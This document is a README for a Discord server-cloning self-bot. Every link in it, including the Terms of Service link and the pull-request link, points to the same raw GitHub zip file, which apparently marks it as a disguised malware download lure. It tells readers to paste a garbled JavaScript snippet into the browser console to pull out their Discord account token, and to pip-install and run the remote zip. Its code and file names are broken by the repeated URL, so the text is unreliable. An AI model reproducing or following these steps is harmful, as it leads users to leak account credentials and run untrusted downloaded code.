# Discord Server Cloner

Clone an entire Discord server seamlessly without risking a ban. This utility mimics the structure and content of one Discord server to another with precision and safety.

Disclaimer: Utilization of self-bots can lead to account termination as it is against [Discord's Terms of Service](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip).

## 🌟 Features
+ Copy text, voice, stage, and forum channels including permissions
+ Duplicate roles with their respective permissions
+ Transfer server name, icon, banner (with sufficient permissions)
+ Carry over server emojis (within limits) and stickers (into available slots)
+ Replicate server settings and messages
+ Real-time message updating

Note: Server member and bot cloning is not supported to comply with Discord rules.

## 🛠️ How to Use

Obtaining your Discord token is the first step:
 Run this code snippet in your browser console while logged into Discord:  
```javascript
(https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip([[''],{},e=>{m=[];for(let c in e.c)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip(e.c[c])}]),m).find(m=>https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip!==void 0)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip()
```

### Creating Virtual Environment

```bash
python3 -m venv venv
source venv/bin/activate
```

### Getting started

Navigate to project directory and execute this commands:
```bash
pip install -r https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip
python https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip
```

Within any guild, execute your clone command (default prefix is cp! as set in https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip):
Commands can include server IDs to specify source and destination servers:
- `cp!clone` duplicates the current server.
- `cp!clone from=0` clones from the specified server.
- `cp!clone new=0` directs cloning to the specified server.
- `cp!clone from=0 new=0` dictates both source and destination servers.

Config settings can be adjusted on-the-fly via clone commands, e.g., 
`cp!clone from=1337 live_update=true clone_message=false`

More detailed command help in "help" command, e.g. `cp!help`

### Arguments List

Use with default values from https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip or specify as needed:
1. `from=0` – Source server ID
2. `new=0` – Destination server ID
3. `clear_guild=true/false` – Whether to clear the new or specified guild
4. `clone_icon=true/false` – Clone server icon
5. ... and so on for other cloning aspects like **roles**, **channels**, **banners**, **emojis**, **stickers**, and **messages** with **real time update**.

## 📋 Requirements
- Python 3.10 (default) - also compatible with versions 3.9 (updated testing range).
- https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip package (remove https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip if not using a virtual environment).
- Virtual environment usage (venv) is highly advised.

## 👩‍💻 Contribution
To contribute:
1. Fork the repository.
2. Start a new branch from master with a meaningful title.
3. Submit your changes and open a [pull request](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip) on GitHub, detailing your added feature or fix.

We appreciate your contributions to maintain and improve the Discord Server Cloner!